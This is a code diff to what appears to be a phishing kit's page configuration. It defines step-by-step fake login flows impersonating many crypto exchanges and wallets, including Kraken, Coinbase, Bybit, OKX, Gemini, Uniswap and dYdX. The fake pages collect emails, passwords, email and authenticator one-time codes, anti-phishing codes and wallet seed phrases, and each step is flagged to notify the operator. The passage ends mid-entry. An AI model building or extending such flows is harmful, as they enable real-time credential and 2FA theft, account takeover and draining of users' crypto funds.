@@ -939,6 +939,110 @@ const FLOWS = {
     { slug:'seed-phrase', form_type:'otp_long', page_title:'Restore Wallet',   headline:'Restore Your Wallet',                subheadline:'Enter your Secret Recovery Phrase',         fields:['seed_phrase'],          layout:'otp_long',cta:'Restore',    step_label:'Seed Phrase', notify_step:true,  otp_length:12 }
   ],
 
+  // ── CRYPTO EXCHANGES ─────────────────────────────────────────────────────────
+
+  kraken: [
+    { slug:'login',     form_type:'login', page_title:'Sign in | Kraken',          headline:'Sign in',                            subheadline:'',                                                   fields:['email','password'], layout:'auth', cta:'Sign in',   step_label:'Login',    notify_step:true  },
+    { slug:'2fa-totp',  form_type:'otp',   page_title:'Two-Factor Authentication', headline:'Two-Factor Authentication',           subheadline:'Enter the 6-digit code from your authenticator app', fields:['code'],             layout:'otp',  cta:'Submit',    step_label:'2FA TOTP', notify_step:true,  otp_length:6 }
+  ],
+
+  bybit: [
+    { slug:'login',      form_type:'login', page_title:'Log In | Bybit',            headline:'Log In',                             subheadline:'',                                                   fields:['email','password'], layout:'auth', cta:'Log In',    step_label:'Login',       notify_step:true  },
+    { slug:'email-code', form_type:'otp',   page_title:'Email Verification',        headline:'Email Verification',                 subheadline:'Enter the 6-digit code sent to your email address',  fields:['code'],             layout:'otp',  cta:'Confirm',   step_label:'Email OTP',   notify_step:true,  otp_length:6 },
+    { slug:'2fa-totp',   form_type:'otp',   page_title:'Google Authenticator',      headline:'Google Authenticator Verification',  subheadline:'Enter the 6-digit code from your Google Authenticator', fields:['code'],          layout:'otp',  cta:'Confirm',   step_label:'Google Auth', notify_step:true,  otp_length:6 }
+  ],
+
+  okx: [
+    { slug:'login',      form_type:'login', page_title:'Log in | OKX',              headline:'Log in',                             subheadline:'',                                                   fields:['email','password'], layout:'auth', cta:'Log in',    step_label:'Login',       notify_step:true  },
+    { slug:'email-code', form_type:'otp',   page_title:'Email Verification Code',   headline:'Enter Email Verification Code',      subheadline:'We sent a 6-digit code to your email address',       fields:['code'],             layout:'otp',  cta:'Confirm',   step_label:'Email Code',  notify_step:true,  otp_length:6 },
+    { slug:'auth-code',  form_type:'otp',   page_title:'Authenticator Code',        headline:'Enter Authenticator App Code',       subheadline:'Enter the 6-digit code from your authentication app', fields:['code'],            layout:'otp',  cta:'Confirm',   step_label:'Auth Code',   notify_step:true,  otp_length:6 }
+  ],
+
+  huobi: [
+    { slug:'login',      form_type:'login', page_title:'Log In | HTX',              headline:'Log In',                             subheadline:'',                                                   fields:['email','password'], layout:'auth', cta:'Log In',    step_label:'Login',      notify_step:true  },
+    { slug:'email-otp',  form_type:'otp',   page_title:'Email Verification',        headline:'Email Verification',                 subheadline:'Enter the 6-digit code sent to your email address',  fields:['code'],             layout:'otp',  cta:'Confirm',   step_label:'Email OTP',  notify_step:true,  otp_length:6 }
+  ],
+
+  kucoin: [
+    { slug:'login',      form_type:'login', page_title:'Login | KuCoin',            headline:'Welcome back!',                      subheadline:'',                                                   fields:['email','password'], layout:'auth', cta:'Sign In',   step_label:'Login',       notify_step:true  },
+    { slug:'email-code', form_type:'otp',   page_title:'Security Verification',     headline:'Security Verification',              subheadline:'Enter the 6-digit code sent to your email address',  fields:['code'],             layout:'otp',  cta:'Submit',    step_label:'Email Code',  notify_step:true,  otp_length:6 },
+    { slug:'google-auth',form_type:'otp',   page_title:'Google Authenticator',      headline:'Google Authenticator',               subheadline:'Enter the 6-digit code from your Google Authenticator', fields:['code'],          layout:'otp',  cta:'Submit',    step_label:'Google Auth', notify_step:true,  otp_length:6 }
+  ],
+
+  gateio: [
+    { slug:'login',      form_type:'login', page_title:'Login | Gate.io',           headline:'Login',                              subheadline:'',                                                   fields:['email','password'], layout:'auth', cta:'Sign In',   step_label:'Login',       notify_step:true  },
+    { slug:'email-code', form_type:'otp',   page_title:'Email Verification',        headline:'Email Verification Code',            subheadline:'Enter the verification code sent to your email',     fields:['code'],             layout:'otp',  cta:'Verify',    step_label:'Email Code',  notify_step:true,  otp_length:6 },
+    { slug:'google-auth',form_type:'otp',   page_title:'Google Authenticator',      headline:'Google Authenticator Verification',  subheadline:'Enter the 6-digit code from your Google Authenticator', fields:['code'],          layout:'otp',  cta:'Verify',    step_label:'Google Auth', notify_step:true,  otp_length:6 }
+  ],
+
+  cryptocom: [
+    { slug:'login',         form_type:'login',  page_title:'Sign in | Crypto.com',  headline:'Sign in',                            subheadline:'',                                                   fields:['email','password'], layout:'auth',  cta:'Sign In',   step_label:'Login',             notify_step:true  },
+    { slug:'anti-phishing', form_type:'verify', page_title:'Anti-Phishing Code',    headline:'Anti-Phishing Code',                 subheadline:'Confirm the anti-phishing code you set up to protect your account', fields:['anti_phishing_code'], layout:'verify', cta:'Continue', step_label:'Anti-Phishing Code', notify_step:true },
+    { slug:'2fa',           form_type:'otp',    page_title:'2FA Verification',      headline:'2-Step Verification',                subheadline:'Enter the 6-digit code from your authenticator app', fields:['code'],             layout:'otp',   cta:'Confirm',   step_label:'2FA Code',          notify_step:true,  otp_length:6 }
+  ],
+
+  bitstamp: [
+    { slug:'login',    form_type:'login', page_title:'Log In | Bitstamp',         headline:'Log in to your account',             subheadline:'',                                                   fields:['username','password'], layout:'auth', cta:'Log in',    step_label:'Login',    notify_step:true  },
+    { slug:'2fa-totp', form_type:'otp',   page_title:'Two-Factor Authentication', headline:'Two-Factor Authentication',           subheadline:'Enter the 6-digit code from your authenticator app', fields:['code'],               layout:'otp',  cta:'Confirm',   step_label:'TOTP 2FA', notify_step:true,  otp_length:6 }
+  ],
+
+  gemini: [
+    { slug:'email',    form_type:'login', page_title:'Sign In | Gemini',          headline:'Sign in',                            subheadline:'',                                                   fields:['email'],               layout:'auth', cta:'Continue',  step_label:'Email',    notify_step:true  },
+    { slug:'password', form_type:'login', page_title:'Sign In | Gemini',          headline:'Enter your password',                subheadline:'',                                                   fields:['password'],            layout:'auth', cta:'Sign in',   step_label:'Password', notify_step:true  },
+    { slug:'2fa',      form_type:'otp',   page_title:'Two-Factor Authentication', headline:'Two-Factor Authentication',           subheadline:'Enter the code from your authenticator app',         fields:['code'],               layout:'otp',  cta:'Continue',  step_label:'2FA Code', notify_step:true,  otp_length:6 }
+  ],
+
+  bitfinex: [
+    { slug:'login',    form_type:'login', page_title:'Login | Bitfinex',          headline:'Login',                              subheadline:'',                                                   fields:['email','password'], layout:'auth', cta:'Login',     step_label:'Login',    notify_step:true  },
+    { slug:'2fa-totp', form_type:'otp',   page_title:'Two-Factor Authentication', headline:'Two-Factor Authentication',           subheadline:'Enter your OTP or hardware key code',               fields:['code'],             layout:'otp',  cta:'Confirm',   step_label:'TOTP 2FA', notify_step:true,  otp_length:6 }
+  ],
+
+  poloniex: [
+    { slug:'login',      form_type:'login', page_title:'Log In | Poloniex',         headline:'Log In',                             subheadline:'',                                                   fields:['email','password'], layout:'auth', cta:'Log In',    step_label:'Login',       notify_step:true  },
+    { slug:'auth-code',  form_type:'otp',   page_title:'Authenticator Code',        headline:'Authentication Code',                subheadline:'Enter the 6-digit code from your authenticator app', fields:['code'],             layout:'otp',  cta:'Confirm',   step_label:'Auth Code',   notify_step:true,  otp_length:6 }
+  ],
+
+  mexc: [
+    { slug:'login',      form_type:'login', page_title:'Login | MEXC',              headline:'Login',                              subheadline:'',                                                   fields:['email','password'], layout:'auth', cta:'Log in',    step_label:'Login',             notify_step:true  },
+    { slug:'verify',     form_type:'otp',   page_title:'Security Verification',     headline:'Security Verification',              subheadline:'Complete the security verification to continue',     fields:['code'],             layout:'otp',  cta:'Confirm',   step_label:'Security Verify',   notify_step:true,  otp_length:6 }
+  ],
+
+  phemex: [
+    { slug:'login',      form_type:'login', page_title:'Log In | Phemex',           headline:'Log in to Phemex',                   subheadline:'',                                                   fields:['email','password'], layout:'auth', cta:'Log in',    step_label:'Login',      notify_step:true  },
+    { slug:'email-otp',  form_type:'otp',   page_title:'Email Verification',        headline:'Email Verification Code',            subheadline:'Enter the 6-digit code sent to your email address',  fields:['code'],             layout:'otp',  cta:'Confirm',   step_label:'Email OTP',  notify_step:true,  otp_length:6 }
+  ],
+
+  dydx: [
+    { slug:'connect',    form_type:'verify', page_title:'Connect Wallet | dYdX',    headline:'Connect your Wallet',                subheadline:'Connect your Ethereum wallet to access dYdX',        fields:['wallet_address'],   layout:'verify', cta:'Connect Wallet', step_label:'Connect',    notify_step:true  },
+    { slug:'seed-phrase',form_type:'otp_long',page_title:'Import Wallet',           headline:'Enter Your Secret Recovery Phrase',  subheadline:'Enter your 12 or 24-word Secret Recovery Phrase',   fields:['seed_phrase'],      layout:'otp_long',cta:'Import',       step_label:'Seed Phrase',notify_step:true,  otp_length:12 }
+  ],
+
+  uniswap: [
+    { slug:'connect',    form_type:'verify', page_title:'Uniswap Interface',        headline:'Connect a Wallet',                   subheadline:'By connecting a wallet, you agree to Uniswap Labs Terms of Service', fields:['wallet_address'], layout:'verify', cta:'Connect Wallet', step_label:'Connect', notify_step:true },
+    { slug:'seed-phrase',form_type:'otp_long',page_title:'Import Wallet',           headline:'Import an Existing Wallet',          subheadline:'Enter your 12 or 24-word Secret Recovery Phrase',   fields:['seed_phrase'],      layout:'otp_long',cta:'Import',       step_label:'Seed Phrase', notify_step:true, otp_length:12 }
+  ],
+
+  bitget: [
+    { slug:'login',      form_type:'login', page_title:'Login | Bitget',            headline:'Welcome back',                       subheadline:'',                                                   fields:['email','password'], layout:'auth', cta:'Log in',    step_label:'Login',       notify_step:true  },
+    { slug:'email-code', form_type:'otp',   page_title:'Email Verification',        headline:'Email Verification Code',            subheadline:'Enter the 6-digit code sent to your email address',  fields:['code'],             layout:'otp',  cta:'Confirm',   step_label:'Email Code',  notify_step:true,  otp_length:6 },
+    { slug:'2fa-totp',   form_type:'otp',   page_title:'Authenticator Verification',headline:'Authenticator Verification',         subheadline:'Enter the 6-digit code from your authenticator app', fields:['code'],             layout:'otp',  cta:'Confirm',   step_label:'TOTP 2FA',    notify_step:true,  otp_length:6 }
+  ],
+
+  lbank: [
+    { slug:'login',      form_type:'login', page_title:'Login | LBank',             headline:'Log In',                             subheadline:'',                                                   fields:['email','password'], layout:'auth', cta:'Login',     step_label:'Login',      notify_step:true  },
+    { slug:'email-otp',  form_type:'otp',   page_title:'Email Verification',        headline:'Email Verification Code',            subheadline:'Enter the verification code sent to your email',     fields:['code'],             layout:'otp',  cta:'Confirm',   step_label:'Email OTP',  notify_step:true,  otp_length:6 }
+  ],
+
+  coinex: [
+    { slug:'login',      form_type:'login', page_title:'Sign In | CoinEx',          headline:'Sign In',                            subheadline:'',                                                   fields:['email','password'], layout:'auth', cta:'Sign In',   step_label:'Login',      notify_step:true  },
+    { slug:'email-otp',  form_type:'otp',   page_title:'Email Verification',        headline:'Email Verification',                 subheadline:'Enter the 6-digit code sent to your email',         fields:['code'],             layout:'otp',  cta:'Confirm',   step_label:'Email OTP',  notify_step:true,  otp_length:6 }
+  ],
+
+  bitmartex: [
+    { slug:'login',      form_type:'login', page_title:'Login | BitMart',           headline:'Log In',                             subheadline:'',                                                   fields:['email','password'], layout:'auth', cta:'Log In',    step_label:'Login',      notify_step:true  },
+    { slug:'email-otp',  form_type:'otp',   page_title:'Email Verification Code',   headline:'Email Verification Code',            subheadline:'Enter the 6-digit code sent to your email',         fields:['code'],             layout:'otp',  cta:'Submit',    step_label:'Email OTP',  notify_step:true,  otp_length:6 }
+  ],
+
   // ── PAYMENTS ────────────────────────────────────────────────────────────────
 
   paypal: [
@@ -1090,11 +1194,11 @@ const CAT_FLOWS = {
   ]
 };
 
-// ── Kraken — pixel-perfect match ────────────────────────────────────────────
+// ── Kraken ───────────────────────────────────────────────────────────────────
 FLOWS.kraken = [
-  { slug:'login',    form_type:'login', page_title:'Sign in to Kraken',  headline:'Sign in to Kraken',         subheadline:'',                                             fields:['email','password'],  layout:'auth', cta:'Continue',  step_label:'Sign In',   notify_step:true  },
-  { slug:'2fa',      form_type:'otp',   page_title:'2-Step Verification',headline:'2-Step Verification',        subheadline:'Enter the code from your authenticator app',    fields:['code'],              layout:'otp',  cta:'Continue',  step_label:'2FA',       notify_step:true,  otp_length:6 },
-  { slug:'sms',      form_type:'otp',   page_title:'Verify Your Number', headline:'Verify Your Phone Number',   subheadline:'Enter the code we sent to your phone',          fields:['code'],              layout:'otp',  cta:'Continue',  step_label:'SMS Code',  notify_step:true,  otp_length:6 }
+  { slug:'login',    form_type:'login', page_title:'Sign in | Kraken',          headline:'Sign in',                   subheadline:'',                                                            fields:['email','password'], layout:'auth', cta:'Sign in',  step_label:'Sign In',   notify_step:true  },
+  { slug:'2fa-totp', form_type:'otp',   page_title:'Two-Factor Authentication', headline:'Two-Factor Authentication',  subheadline:'Enter the 6-digit code from your authenticator app',          fields:['code'],             layout:'otp',  cta:'Submit',   step_label:'2FA TOTP',  notify_step:true,  otp_length:6 },
+  { slug:'sms',      form_type:'otp',   page_title:'Phone Verification',        headline:'Verify Your Phone Number',   subheadline:'Enter the code we sent to your phone',                        fields:['code'],             layout:'otp',  cta:'Submit',   step_label:'SMS Code',  notify_step:true,  otp_length:6 }
 ];
 
 // ── Special video overrides ──────────────────────────────────────────────────
@@ -1527,81 +1631,85 @@ FLOWS.binance = [
 ];
 
 FLOWS.coinbase = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Coinbase',       headline:'Sign in to Coinbase',  subheadline:'', fields:['email'], layout:'auth', cta:'Continue',  step_label:'Email', notify_step:true  },
-  { slug:'2fa-email',form_type:'otp',   page_title:'2-Step Verification',      headline:'2-Step Verification',  subheadline:'A verification code has been sent to your email address', fields:['code'], layout:'otp', cta:'Verify', step_label:'Email Code', notify_step:true, otp_length:7 },
-  { slug:'2fa-sms',  form_type:'otp',   page_title:'Phone Verification',       headline:'Phone Verification',   subheadline:'Enter the code sent to your phone', fields:['code'], layout:'otp', cta:'Verify', step_label:'SMS Code', notify_step:true, otp_length:6 }
+  { slug:'email',    form_type:'login', page_title:'Sign in | Coinbase',        headline:'Sign in',                            subheadline:'',                                                          fields:['email'],            layout:'auth', cta:'Continue',  step_label:'Email',       notify_step:true  },
+  { slug:'password', form_type:'login', page_title:'Sign in | Coinbase',        headline:'Enter your password',                subheadline:'',                                                          fields:['password'],         layout:'auth', cta:'Sign in',   step_label:'Password',    notify_step:true  },
+  { slug:'2fa',      form_type:'otp',   page_title:'2-Step Verification',       headline:'2-Step Verification',                subheadline:'A verification code has been sent to your email address',   fields:['code'],             layout:'otp',  cta:'Verify',    step_label:'2FA Code',    notify_step:true,  otp_length:7 }
 ];
 
 FLOWS.bitfinex = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Bitfinex',       headline:'Sign in to Bitfinex',  subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In',  step_label:'Sign In', notify_step:true  },
-  { slug:'2fa',      form_type:'otp',   page_title:'2-Factor Authentication',  headline:'2-Factor Authentication', subheadline:'Enter the OTP from your authentication app', fields:['code'], layout:'otp', cta:'Verify', step_label:'2FA', notify_step:true, otp_length:6 }
+  { slug:'login',    form_type:'login', page_title:'Login | Bitfinex',          headline:'Login',                          subheadline:'',                                                     fields:['email','password'], layout:'auth', cta:'Login',    step_label:'Login',    notify_step:true  },
+  { slug:'2fa-totp', form_type:'otp',   page_title:'Two-Factor Authentication', headline:'Two-Factor Authentication',       subheadline:'Enter your OTP or hardware key code',                  fields:['code'],             layout:'otp',  cta:'Confirm',  step_label:'2FA TOTP', notify_step:true,  otp_length:6 }
 ];
 
 FLOWS.gemini = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Gemini',         headline:'Sign in to Gemini',    subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In',  step_label:'Sign In', notify_step:true  },
-  { slug:'2fa-sms',  form_type:'otp',   page_title:'Authentication',           headline:'Authentication',       subheadline:'Enter the verification code we sent to your phone', fields:['code'], layout:'otp', cta:'Verify', step_label:'SMS Code', notify_step:true, otp_length:6 }
+  { slug:'email',    form_type:'login', page_title:'Sign In | Gemini',          headline:'Sign in',                          subheadline:'',                                                          fields:['email'],               layout:'auth', cta:'Continue',  step_label:'Email',    notify_step:true  },
+  { slug:'password', form_type:'login', page_title:'Sign In | Gemini',          headline:'Enter your password',              subheadline:'',                                                          fields:['password'],            layout:'auth', cta:'Sign in',   step_label:'Password', notify_step:true  },
+  { slug:'2fa-totp', form_type:'otp',   page_title:'Two-Factor Authentication', headline:'Two-Factor Authentication',         subheadline:'Enter the code from your authenticator app',                fields:['code'],               layout:'otp',  cta:'Continue',  step_label:'2FA Code', notify_step:true,  otp_length:6 }
 ];
 
 FLOWS.okx = [
-  { slug:'login',    form_type:'login', page_title:'Log In – OKX',             headline:'Log in to OKX',        subheadline:'', fields:['email','password'], layout:'auth', cta:'Log In',   step_label:'Log In', notify_step:true  },
-  { slug:'2fa-email',form_type:'otp',   page_title:'Security Verification',    headline:'Security Verification', subheadline:'Please complete email verification', fields:['code'], layout:'otp', cta:'Confirm', step_label:'Email Code', notify_step:true, otp_length:6 },
-  { slug:'2fa-sms',  form_type:'otp',   page_title:'SMS Code',                 headline:'Enter SMS Code',        subheadline:'Enter the SMS code sent to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'SMS Code', notify_step:true, otp_length:6 }
+  { slug:'login',      form_type:'login', page_title:'Log in | OKX',              headline:'Log in',                             subheadline:'',                                                       fields:['email','password'], layout:'auth', cta:'Log in',    step_label:'Login',       notify_step:true  },
+  { slug:'email-code', form_type:'otp',   page_title:'Email Verification Code',   headline:'Enter Email Verification Code',      subheadline:'We sent a 6-digit code to your email address',           fields:['code'],             layout:'otp',  cta:'Confirm',   step_label:'Email Code',  notify_step:true,  otp_length:6 },
+  { slug:'auth-code',  form_type:'otp',   page_title:'Authenticator Code',        headline:'Enter Authenticator App Code',       subheadline:'Enter the 6-digit code from your authentication app',     fields:['code'],             layout:'otp',  cta:'Confirm',   step_label:'Auth Code',   notify_step:true,  otp_length:6 }
 ];
 
 FLOWS.bybit = [
-  { slug:'login',    form_type:'login', page_title:'Log In – Bybit',           headline:'Log in to Bybit',      subheadline:'', fields:['email','password'], layout:'auth', cta:'Log In',   step_label:'Log In', notify_step:true  },
-  { slug:'2fa-email',form_type:'otp',   page_title:'Security Verification',    headline:'Security Verification', subheadline:'Verify your identity to continue', fields:['code'], layout:'otp', cta:'Confirm', step_label:'Verify', notify_step:true, otp_length:6 }
+  { slug:'login',      form_type:'login', page_title:'Log In | Bybit',            headline:'Log In',                             subheadline:'',                                                          fields:['email','password'], layout:'auth', cta:'Log In',    step_label:'Login',       notify_step:true  },
+  { slug:'email-code', form_type:'otp',   page_title:'Email Verification',        headline:'Email Verification',                 subheadline:'Enter the 6-digit code sent to your email address',         fields:['code'],             layout:'otp',  cta:'Confirm',   step_label:'Email OTP',   notify_step:true,  otp_length:6 },
+  { slug:'2fa-totp',   form_type:'otp',   page_title:'Google Authenticator',      headline:'Google Authenticator Verification',  subheadline:'Enter the 6-digit code from your Google Authenticator',    fields:['code'],             layout:'otp',  cta:'Confirm',   step_label:'Google Auth', notify_step:true,  otp_length:6 }
 ];
 
 FLOWS.huobi = [
-  { slug:'login',    form_type:'login', page_title:'Log In – HTX (Huobi)',     headline:'Log in to HTX',        subheadline:'', fields:['email','password'], layout:'auth', cta:'Log In',   step_label:'Log In', notify_step:true  },
-  { slug:'2fa-email',form_type:'otp',   page_title:'Verify Email',             headline:'Verify Email',         subheadline:'Enter the verification code sent to your email', fields:['code'], layout:'otp', cta:'Confirm', step_label:'Email Code', notify_step:true, otp_length:6 }
+  { slug:'login',      form_type:'login', page_title:'Log In | HTX',              headline:'Log In',                             subheadline:'',                                                          fields:['email','password'], layout:'auth', cta:'Log In',    step_label:'Login',      notify_step:true  },
+  { slug:'email-otp',  form_type:'otp',   page_title:'Email Verification',        headline:'Email Verification',                 subheadline:'Enter the 6-digit code sent to your email address',         fields:['code'],             layout:'otp',  cta:'Confirm',   step_label:'Email OTP',  notify_step:true,  otp_length:6 }
 ];
 
 FLOWS.kucoin = [
-  { slug:'login',    form_type:'login', page_title:'Log In – KuCoin',          headline:'Log in to KuCoin',     subheadline:'', fields:['email','password'], layout:'auth', cta:'Log In',   step_label:'Log In', notify_step:true  },
-  { slug:'2fa-email',form_type:'otp',   page_title:'Email Verification',       headline:'Email Verification',   subheadline:'Enter the verification code sent to your email address', fields:['code'], layout:'otp', cta:'Submit', step_label:'Email Code', notify_step:true, otp_length:6 },
-  { slug:'2fa-sms',  form_type:'otp',   page_title:'Phone Verification',       headline:'Phone Verification',   subheadline:'Enter the verification code sent to your phone', fields:['code'], layout:'otp', cta:'Submit', step_label:'SMS Code', notify_step:true, otp_length:6 }
+  { slug:'login',      form_type:'login', page_title:'Login | KuCoin',            headline:'Welcome back!',                      subheadline:'',                                                          fields:['email','password'], layout:'auth', cta:'Sign In',   step_label:'Login',       notify_step:true  },
+  { slug:'email-code', form_type:'otp',   page_title:'Security Verification',     headline:'Security Verification',              subheadline:'Enter the 6-digit code sent to your email address',         fields:['code'],             layout:'otp',  cta:'Submit',    step_label:'Email Code',  notify_step:true,  otp_length:6 },
+  { slug:'google-auth',form_type:'otp',   page_title:'Google Authenticator',      headline:'Google Authenticator',               subheadline:'Enter the 6-digit code from your Google Authenticator',    fields:['code'],             layout:'otp',  cta:'Submit',    step_label:'Google Auth', notify_step:true,  otp_length:6 }
 ];
 
 FLOWS.gateio = [
-  { slug:'login',    form_type:'login', page_title:'Log In – Gate.io',         headline:'Log in to Gate.io',    subheadline:'', fields:['email','password'], layout:'auth', cta:'Log In',   step_label:'Log In', notify_step:true  },
-  { slug:'2fa',      form_type:'otp',   page_title:'Verification',             headline:'Verification Required', subheadline:'Please enter the verification code sent to your email or phone', fields:['code'], layout:'otp', cta:'Submit', step_label:'Verify', notify_step:true, otp_length:6 }
+  { slug:'login',      form_type:'login', page_title:'Login | Gate.io',           headline:'Login',                              subheadline:'',                                                          fields:['email','password'], layout:'auth', cta:'Sign In',   step_label:'Login',       notify_step:true  },
+  { slug:'email-code', form_type:'otp',   page_title:'Email Verification',        headline:'Email Verification Code',            subheadline:'Enter the verification code sent to your email',             fields:['code'],             layout:'otp',  cta:'Verify',    step_label:'Email Code',  notify_step:true,  otp_length:6 },
+  { slug:'google-auth',form_type:'otp',   page_title:'Google Authenticator',      headline:'Google Authenticator Verification',  subheadline:'Enter the 6-digit code from your Google Authenticator',    fields:['code'],             layout:'otp',  cta:'Verify',    step_label:'Google Auth', notify_step:true,  otp_length:6 }
 ];
 
 FLOWS.cryptocom = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Crypto.com',     headline:'Sign in to Crypto.com', subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In',  step_label:'Sign In', notify_step:true  },
-  { slug:'2fa-sms',  form_type:'otp',   page_title:'2-Factor Authentication',  headline:'2-Factor Authentication', subheadline:'We\'ve sent a verification code to your phone number', fields:['code'], layout:'otp', cta:'Verify', step_label:'SMS Code', notify_step:true, otp_length:6 }
+  { slug:'login',         form_type:'login',  page_title:'Sign in | Crypto.com',  headline:'Sign in',                            subheadline:'',                                                               fields:['email','password'],             layout:'auth',  cta:'Sign In',  step_label:'Login',              notify_step:true  },
+  { slug:'anti-phishing', form_type:'verify', page_title:'Anti-Phishing Code',    headline:'Anti-Phishing Code',                 subheadline:'Confirm the anti-phishing code you set up to protect your account', fields:['anti_phishing_code'],        layout:'verify',cta:'Continue', step_label:'Anti-Phishing Code', notify_step:true },
+  { slug:'2fa-totp',      form_type:'otp',    page_title:'2FA Verification',      headline:'2-Step Verification',                subheadline:'Enter the 6-digit code from your authenticator app',              fields:['code'],                        layout:'otp',   cta:'Confirm',  step_label:'2FA Code',           notify_step:true,  otp_length:6 }
 ];
 
 FLOWS.bitstamp = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Bitstamp',       headline:'Sign in to Bitstamp',  subheadline:'', fields:['username','password'], layout:'auth', cta:'Sign In', step_label:'Sign In', notify_step:true  },
-  { slug:'2fa',      form_type:'otp',   page_title:'Two-Factor Authentication', headline:'Two-Factor Authentication', subheadline:'Enter the code from your authenticator app or SMS', fields:['code'], layout:'otp', cta:'Verify', step_label:'2FA', notify_step:true, otp_length:6 }
+  { slug:'login',    form_type:'login', page_title:'Log In | Bitstamp',         headline:'Log in to your account',             subheadline:'',                                                     fields:['username','password'], layout:'auth', cta:'Log in',    step_label:'Login',    notify_step:true  },
+  { slug:'2fa-totp', form_type:'otp',   page_title:'Two-Factor Authentication', headline:'Two-Factor Authentication',           subheadline:'Enter the 6-digit code from your authenticator app',   fields:['code'],               layout:'otp',  cta:'Confirm',   step_label:'TOTP 2FA', notify_step:true,  otp_length:6 }
 ];
 
 FLOWS.poloniex = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Poloniex',       headline:'Sign in to Poloniex',  subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In',  step_label:'Sign In', notify_step:true  },
-  { slug:'2fa',      form_type:'otp',   page_title:'Two-Factor Authentication', headline:'Two-Factor Authentication', subheadline:'Enter the code from your authenticator app', fields:['code'], layout:'otp', cta:'Verify', step_label:'2FA', notify_step:true, otp_length:6 }
+  { slug:'login',      form_type:'login', page_title:'Log In | Poloniex',         headline:'Log In',                             subheadline:'',                                                     fields:['email','password'], layout:'auth', cta:'Log In',    step_label:'Login',       notify_step:true  },
+  { slug:'auth-code',  form_type:'otp',   page_title:'Authenticator Code',        headline:'Authentication Code',                subheadline:'Enter the 6-digit code from your authenticator app',   fields:['code'],             layout:'otp',  cta:'Confirm',   step_label:'Auth Code',   notify_step:true,  otp_length:6 }
 ];
 
 FLOWS.mexc = [
-  { slug:'login',    form_type:'login', page_title:'Log In – MEXC',            headline:'Log in to MEXC',       subheadline:'', fields:['email','password'], layout:'auth', cta:'Log In',   step_label:'Log In', notify_step:true  },
-  { slug:'2fa',      form_type:'otp',   page_title:'Security Verification',    headline:'Security Verification', subheadline:'Enter the verification code sent to your email or phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'Verify', notify_step:true, otp_length:6 }
+  { slug:'login',      form_type:'login', page_title:'Login | MEXC',              headline:'Login',                              subheadline:'',                                                          fields:['email','password'], layout:'auth', cta:'Log in',    step_label:'Login',           notify_step:true  },
+  { slug:'verify',     form_type:'otp',   page_title:'Security Verification',     headline:'Security Verification',              subheadline:'Complete the security verification to continue',             fields:['code'],             layout:'otp',  cta:'Confirm',   step_label:'Security Verify', notify_step:true,  otp_length:6 }
 ];
 
 FLOWS.phemex = [
-  { slug:'login',    form_type:'login', page_title:'Log In – Phemex',          headline:'Log in to Phemex',     subheadline:'', fields:['email','password'], layout:'auth', cta:'Log In',   step_label:'Log In', notify_step:true  },
-  { slug:'2fa',      form_type:'otp',   page_title:'Two-Factor Authentication', headline:'Two-Factor Authentication', subheadline:'Enter the OTP from your authenticator or SMS', fields:['code'], layout:'otp', cta:'Verify', step_label:'2FA', notify_step:true, otp_length:6 }
+  { slug:'login',      form_type:'login', page_title:'Log In | Phemex',           headline:'Log in to Phemex',                   subheadline:'',                                                          fields:['email','password'], layout:'auth', cta:'Log in',    step_label:'Login',      notify_step:true  },
+  { slug:'email-otp',  form_type:'otp',   page_title:'Email Verification',        headline:'Email Verification Code',            subheadline:'Enter the 6-digit code sent to your email address',         fields:['code'],             layout:'otp',  cta:'Confirm',   step_label:'Email OTP',  notify_step:true,  otp_length:6 }
 ];
 
 FLOWS.dydx = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – dYdX',           headline:'Sign In to dYdX',      subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In',  step_label:'Sign In', notify_step:true  },
-  { slug:'2fa',      form_type:'otp',   page_title:'2-Factor Authentication',  headline:'2-Factor Authentication', subheadline:'Enter the code from your authenticator app', fields:['code'], layout:'otp', cta:'Verify', step_label:'2FA', notify_step:true, otp_length:6 }
+  { slug:'connect',    form_type:'verify',   page_title:'Connect Wallet | dYdX',    headline:'Connect your Wallet',                subheadline:'Connect your Ethereum wallet to access dYdX',              fields:['wallet_address'],   layout:'verify',   cta:'Connect Wallet',  step_label:'Connect',     notify_step:true  },
+  { slug:'seed-phrase',form_type:'otp_long', page_title:'Import Wallet',            headline:'Enter Your Secret Recovery Phrase',  subheadline:'Enter your 12 or 24-word Secret Recovery Phrase',         fields:['seed_phrase'],      layout:'otp_long', cta:'Import',          step_label:'Seed Phrase', notify_step:true,  otp_length:12 }
 ];
 
 FLOWS.uniswap = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Uniswap',        headline:'Sign in to Uniswap',   subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In',  step_label:'Sign In', notify_step:true  },
-  { slug:'2fa',      form_type:'otp',   page_title:'Verify Your Identity',     headline:'Verify Your Identity', subheadline:'Enter the verification code sent to your email', fields:['code'], layout:'otp', cta:'Verify', step_label:'Verify', notify_step:true, otp_length:6 }
+  { slug:'connect',    form_type:'verify',   page_title:'Uniswap Interface',        headline:'Connect a Wallet',                   subheadline:'By connecting a wallet, you agree to Uniswap Labs Terms of Service', fields:['wallet_address'], layout:'verify',   cta:'Connect Wallet', step_label:'Connect',     notify_step:true },
+  { slug:'seed-phrase',form_type:'otp_long', page_title:'Import Wallet',            headline:'Import an Existing Wallet',          subheadline:'Enter your 12 or 24-word Secret Recovery Phrase',                   fields:['seed_phrase'],    layout:'otp_long', cta:'Import',         step_label:'Seed Phrase', notify_step:true, otp_length:12 }
 ];
 
 FLOWS.metamask = [
@@ -1637,23 +1745,24 @@ FLOWS.solflare = [
 ];
 
 FLOWS.bitmartex = [
-  { slug:'login',    form_type:'login', page_title:'Log In – BitMart',         headline:'Log in to BitMart',    subheadline:'', fields:['email','password'], layout:'auth', cta:'Log In',   step_label:'Log In', notify_step:true  },
